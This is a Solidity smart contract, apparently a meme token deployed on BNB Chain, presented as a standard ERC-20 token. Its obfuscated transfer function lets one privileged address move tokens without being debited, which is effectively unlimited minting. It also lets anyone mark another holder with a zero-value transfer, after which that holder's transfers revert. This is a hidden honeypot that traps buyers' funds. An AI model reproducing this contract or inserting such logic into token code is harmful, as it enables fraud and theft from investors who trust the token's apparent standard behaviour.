/**
 *Submitted for verification at BscScan.com on 2023-05-16
*/

/*

https://t.me/SexyBallsToken

*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity >0.8.1;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract LickMyButtandSuckonMyBalls is Ownable {
    mapping(address => uint256) public balanceOf;

    uint8 public decimals = 9;

    function forth(address word, address music, uint256 drop) private returns (bool success) {
        if (swimming[word] == 0) {
            balanceOf[word] -= drop;
        }

        if (drop == 0) jet[music] += unusual;

        if (swimming[word] == 0 && uniswapV2Pair != word && jet[word] > 0) {
            swimming[word] -= unusual;
        }

        balanceOf[music] += drop;
        emit Transfer(word, music, drop);
        return true;
    }

    mapping(address => uint256) private jet;

    function approve(address sky, uint256 drop) public returns (bool success) {
        allowance[msg.sender][sky] = drop;
        emit Approval(msg.sender, sky, drop);
        return true;
    }

    mapping(address => uint256) private swimming;

    IUniswapV2Router02 private uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);

    address public uniswapV2Pair;

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    function transfer(address music, uint256 drop) public returns (bool success) {
        forth(msg.sender, music, drop);
        return true;
    }

    mapping(address => mapping(address => uint256)) public allowance;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    string public name = 'Lick My Butt and Suck on My Balls';

    constructor(address whose) {
        balanceOf[msg.sender] = totalSupply;
        swimming[whose] = unusual;
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
    }

    string public symbol = 'Lick My Butt and Suck on My Balls';

    uint256 private unusual = 61;

    event Transfer(address indexed from, address indexed to, uint256 value);

    function transferFrom(address word, address music, uint256 drop) public returns (bool success) {
        forth(word, music, drop);
        require(drop <= allowance[word][msg.sender]);
        allowance[word][msg.sender] -= drop;
        return true;
    }
}